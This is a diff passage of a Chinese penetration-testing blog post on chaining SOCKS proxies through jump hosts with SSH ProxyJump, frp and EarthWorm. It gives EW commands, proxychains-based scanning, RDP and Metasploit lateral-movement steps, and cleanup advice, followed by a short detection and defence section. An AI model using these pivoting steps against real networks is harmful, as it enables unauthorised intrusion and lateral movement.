+</span></span></code></pre></td></tr></table></div></div><h3 id=方案3ewearthworm串联老方案>方案3：EW（EarthWorm）串联（老方案）</h3><p>EW 是老牌隧道工具，支持正向/反向 Socks、端口转发，功能全但<strong>流量明文</strong>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>异常 SSH 长连接、多跳连接特征
-</span></span><span class=line><span class=cl>隧道工具进程（frp/ew）特征
-</span></span><span class=line><span class=cl>异常外联与非常规端口
-</span></span><span class=line><span class=cl>出站白名单 + 连接审计
-</span></span></code></pre></td></tr></table></div></div><h2 id=六小结>六、小结</h2><p>多级代理 = “<strong>画拓扑 → 逐级建隧道 → 本地汇聚 → 横向</strong>”。SSH 的 <code>-J</code>/<code>-D</code> 是最轻量的选择，frp 适合复杂级联，EW 是老牌但思路通用。掌握它，才能从“进得去”推进到“够得着核心网段”。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a>
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 跳板1（反向 Socks）：攻击机连过来</span>
+</span></span><span class=line><span class=cl>./ew -s rcsocks -l <span class=m>1080</span> -e <span class=m>8888</span>
+</span></span><span class=line><span class=cl><span class=c1># 含义：攻击机连 1080（socks），跳板1监听 8888 转发</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 攻击机端（反向客户端）</span>
+</span></span><span class=line><span class=cl>./ew -s rssocks -d 跳板1IP -e <span class=m>8888</span>
+</span></span></code></pre></td></tr></table></div></div><p>多级串联：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 跳板2（反向 Socks）</span>
+</span></span><span class=line><span class=cl>./ew -s rcsocks -l <span class=m>1081</span> -e <span class=m>8889</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 跳板1 上转连跳板2</span>
+</span></span><span class=line><span class=cl>./ew -s rssocks -d 跳板2IP -e <span class=m>8889</span>
+</span></span><span class=line><span class=cl><span class=c1># 然后本地 socks 1080 → 跳板1 → 跳板2 → 目标</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>说明：EW 功能全面但流量无加密，易被防火墙识别。
+</span></span><span class=line><span class=cl>现代场景已被 SSH ProxyJump 和 frp 替代，思路仍值得掌握。
+</span></span></code></pre></td></tr></table></div></div><h2 id=五方案对比>五、方案对比</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>┌──────────────┬──────────────────┬──────────────┬──────────────┐
+</span></span><span class=line><span class=cl>│   对比项     │ SSH ProxyJump    │   frp 级联   │    EW 串联   │
+</span></span><span class=line><span class=cl>├──────────────┼──────────────────┼──────────────┼──────────────┤
+</span></span><span class=line><span class=cl>│ 工具需求     │ 仅 SSH           │ 两端 frp     │ 两端 EW      │
+</span></span><span class=line><span class=cl>│ 加密         │ SSH 自带         │ 可配置       │ 无（明文）   │
+</span></span><span class=line><span class=cl>│ 多级支持     │ 支持（-J 链）    │ 支持级联     │ 支持串联     │
+</span></span><span class=line><span class=cl>│ 隐蔽性       │ 高               │ 中-高        │ 低           │
+</span></span><span class=line><span class=cl>│ 落地痕迹     │ 无               │ 有二进制     │ 有二进制     │
+</span></span><span class=line><span class=cl>│ 推荐场景     │ 默认首选         │ 复杂/无 SSH  │ 遗留环境     │
+</span></span><span class=line><span class=cl>└──────────────┴──────────────────┴──────────────┴──────────────┘
+</span></span></code></pre></td></tr></table></div></div><h2 id=六操作步骤>六、操作步骤</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>第 1 步：画内网拓扑，确定需要几级代理
+</span></span><span class=line><span class=cl>  攻击机 → 跳板1 → 跳板2 → 目标
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>第 2 步：选择方案
+</span></span><span class=line><span class=cl>  有 SSH 凭证 → ProxyJump（首选）
+</span></span><span class=line><span class=cl>  无 SSH 凭证 → frp 级联
+</span></span><span class=line><span class=cl>  两者都没有 → EW 串联
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>第 3 步：每级建立隧道
+</span></span><span class=line><span class=cl>  ProxyJump: ssh -J jump1,jump2 target
+</span></span><span class=line><span class=cl>  frp: 每级一个 frps+frpc 实例
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>第 4 步：本地把多级 socks 汇聚（最终一个端口）
+</span></span><span class=line><span class=cl>  proxychains4 nmap -sT -Pn 10.20.0.0/24
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>第 5 步：横向访问目标
+</span></span><span class=line><span class=cl>  proxychains4 rdesktop 10.20.0.5
+</span></span><span class=line><span class=cl>  proxychains4 msfconsole
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>第 6 步：按需加端口转发（RDP/数据库）
+</span></span><span class=line><span class=cl>第 7 步：用后清理代理进程与会话
+</span></span></code></pre></td></tr></table></div></div><h2 id=七检测与防御>七、检测与防御</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>攻击者检测：
+</span></span><span class=line><span class=cl>• 异常 SSH 长连接、多跳连接特征（auth.log 中短时间大量 SSH 登录）
+</span></span><span class=line><span class=cl>• 隧道工具进程特征（frp/ew 二进制名）
+</span></span><span class=line><span class=cl>• 异常外联与非常规端口（7000/7100/1080 等）
+</span></span><span class=line><span class=cl>• 流量规律：frp 自定义协议头，频率稳定
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>防御：
+</span></span><span class=line><span class=cl>• 出站白名单 + 连接审计
+</span></span><span class=line><span class=cl>• EDR 检测隧道工具（二进制签名 + 行为特征）
+</span></span><span class=line><span class=cl>• 东西向隔离：跳板机与核心区之间做访问控制
+</span></span><span class=line><span class=cl>• 监控多级代理链：同一源 IP 在短时间内连接多个跳板
+</span></span></code></pre></td></tr></table></div></div><h2 id=八小结>八、小结</h2><p>多级代理 = &ldquo;画拓扑 → 逐级建隧道 → 本地汇聚 → 横向&rdquo;。SSH ProxyJump 是最轻量的选择（零工具、加密），frp 适合复杂级联（支持加密），EW 是老牌但思路通用。掌握它，才能从"进得去"推进到"够得着核心网段"。</p><hr><h2 id=延伸阅读>延伸阅读</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>• SSH 隧道与内网代理：单级场景的轻量方案
+</span></span><span class=line><span class=cl>• frp 隧道与代理实战：复杂级联场景的 frp 方案
+</span></span><span class=line><span class=cl>• 横向移动 Pass-the-Hash：拿到隧道后如何推进
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a>
 <a href=/tags/%E4%BB%A3%E7%90%86/>代理</a>
 <a href=/tags/%E9%9A%A7%E9%81%93/>隧道</a>
 <a href=/tags/ssh%E9%9A%A7%E9%81%93/>SSH隧道</a>
-<a href=/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/>横向移动</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
-<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088105/><div class=article-details><h2 class=article-title>SSH 隧道与内网代理（本地/远程/动态转发）</h2></div></a></article><article><a href=/p/751088084/><div class=article-details><h2 class=article-title>内网横向移动技术全景</h2></div></a></article><article><a href=/p/751088044/><div class=article-details><h2 class=article-title>内网渗透：frp 隧道与代理实战</h2></div></a></article><article><a href=/p/751088038/><div class=article-details><h2 class=article-title>内网横向移动：Pass-the-Hash 实战</h2></div></a></article><article><a href=/p/751088037/><div class=article-details><h2 class=article-title>内网渗透：信息收集与存活主机探测</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
+<a href=/tags/frp/>Frp</a>
+<a href=/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/>横向移动</a>
+<a href=/tags/proxyjump/>ProxyJump</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<span>最后更新于 Aug 30, 2026 08:30 +0800</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088105/><div class=article-details><h2 class=article-title>SSH 隧道与内网代理（本地/远程/动态转发实战详解）</h2></div></a></article><article><a href=/p/751088044/><div class=article-details><h2 class=article-title>内网渗透：frp 隧道与代理实战（含拓扑图与多级级联）</h2></div></a></article><article><a href=/p/751088084/><div class=article-details><h2 class=article-title>内网横向移动技术全景</h2></div></a></article><article><a href=/p/751088037/><div class=article-details><h2 class=article-title>内网渗透：信息收集与存活主机探测</h2></div></a></article><article><a href=/p/751088083/><div class=article-details><h2 class=article-title>Linux 提权深入：脏牛等内核漏洞</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
 2020 -
 2026 SoulJian小站</div><div class=busuanzi-count><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><span class=site-uv title=访客数><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="visitor-icon"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
 <span id=busuanzi_value_site_uv></span>
